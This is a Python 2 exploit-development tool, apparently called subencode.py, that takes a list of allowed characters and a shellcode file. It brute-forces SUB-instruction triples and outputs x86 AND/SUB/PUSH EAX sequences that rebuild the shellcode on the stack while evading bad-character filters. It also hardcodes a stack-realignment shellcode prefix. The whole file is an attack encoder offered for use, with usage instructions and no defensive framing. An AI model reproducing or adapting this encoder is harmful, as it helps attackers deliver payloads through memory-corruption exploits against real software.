import re
import random
import sys

#Ugly code below

startHex = int('0xffffffff', 16)

#More than likely will need to be modified
finalShellcode = ['\\x25\\x41\\x4d\\x4e\\x55\\x25\\x35\\x32\\x31\\x2a\\x54\\x58\\x2d\\x66\\x4d\\x55\\x55\\x2d\\x66\\x4b\\x55\\x55\\x2d\\x6a\\x50\\x55\\x55\\x50\\x5c']

def grabGoodChars(file):
	#Opens a file containing characters that can be used in shellcode, returns them as a list
	chars = []
	with open(file, 'r') as charfile:
		for line in charfile:
			chars += re.findall(r'\\x([0-9a-fA-F]*)', line)
	print "[*] Found {} good characters out of a possible 256".format(len(chars))
	return chars


def bruteMath(reachMe):
	#What happens when you suck at math....
	#0xffffffff minus a Random seed(SeedA), the difference turned into 2 subtractions by dividing by two
	print "[*] Trying to reach ", hex(reachMe)
	double = False
	if reachMe > int('0xffffffff',16) /2:
		reachMe = int('0xffffffff', 16) - reachMe
		reachMe = -reachMe
		double = True
		print " [!] Needs to pass 0xffffffff twice"
	count = 1
	while True:
		count += 1
		seedA = random.randint(1, int('0xffffffff',16)) #Random seed to subtract from 0xffffffff
		if len(hex(seedA)) == 10: #once a number is too big, it reaches bad char only territory

			if compareChars(goodChars, hex(seedA)):
				nexti = startHex - seedA
				#print nexti, 'minus', reachMe
				nexti = nexti - reachMe #to reach shellcode /2 + 2... painful..
				#print nexti
				nexti = nexti / 2
				#print nexti
				if compareChars(goodChars, hex(nexti)) and compareChars(goodChars, hex(nexti+2)) and compareChars(goodChars, hex(nexti+1)) and len(hex(nexti)) == 10:
					#print hex(startHex - seedA - nexti - (nexti+1))
					if hex(startHex - seedA - nexti - (nexti+1))  == hex(reachMe):
						if double:
							print 'Three SUBs that reach the value --> ', hex(seedA), ' ', hex(nexti), ' ', hex(nexti + 3)
							formatToShellcode([hex(seedA), hex(nexti), hex(nexti+3)])
						else:
							print 'Three SUBs that reach the value -->', hex(seedA), ' ', hex(nexti), ' ', hex(nexti+2)
							formatToShellcode([hex(seedA), hex(nexti), hex(nexti+2)])
							print hex(startHex - seedA - nexti - (nexti + 1))
						print 'Found in ', count, ' iterations'
						print ''
						break


def formatToShellcode(subs):
	tempShellcode = []
	clearEAX = "\\x25\\x4A\\x4D\\x4E\\x55\\x25\\x35\\x32\\x31\\x2A"
	subBase = "\\x2d"
	pushEAX = "\\x50"
	tempShellcode.append(clearEAX)
	for item in subs:
		tempShellcode.append(subBase)
		bytes = re.findall('..', item[2::])[::-1]
		#print bytes
		for byte in bytes:
			tempShellcode.append("\\x" + str(byte))
	tempShellcode.append(pushEAX)

	finalShellcode.append(''.join(tempShellcode))


def compareChars(good, toTest):
	#Takes the good chars and a byte to compare
	toTest = toTest[2:]
	toTest = re.findall('..', toTest)
	for item in toTest:
		if item not in good:
			return False

	return True


def getShellCode(file):
	#Opens a file containing shellcode to encode, then splits into bytes
	byteBlocks = []
	a = []
	with open(file, 'r') as shellcode:
		for line in shellcode:
			a = re.findall('.' * 16, line)
	for item in a:
		woot = item.split('\\x')[::-1]

		byteBlocks.append(str("0x" + ''.join(woot)))
	print "[*] Successfully grabbed shellcode from file"
	return byteBlocks[::-1]

def printUsage():
	print " Pass the script two files, good characters list and shellcode "
	print " USAGE: python subencode.py [GoodChars] [shellcode] "
	sys.exit()

def main():
	print len(sys.argv[:])
	if len(sys.argv[:]) != 3:
		printUsage()

	global goodChars
	goodChars = grabGoodChars(sys.argv[1])

	for please in getShellCode(sys.argv[2]):
		bruteMath(int(please, 16))

	print ' ---ENCODED SHELLCODE---'
	print ''.join(finalShellcode)

if '__main__' == __name__:
	main()
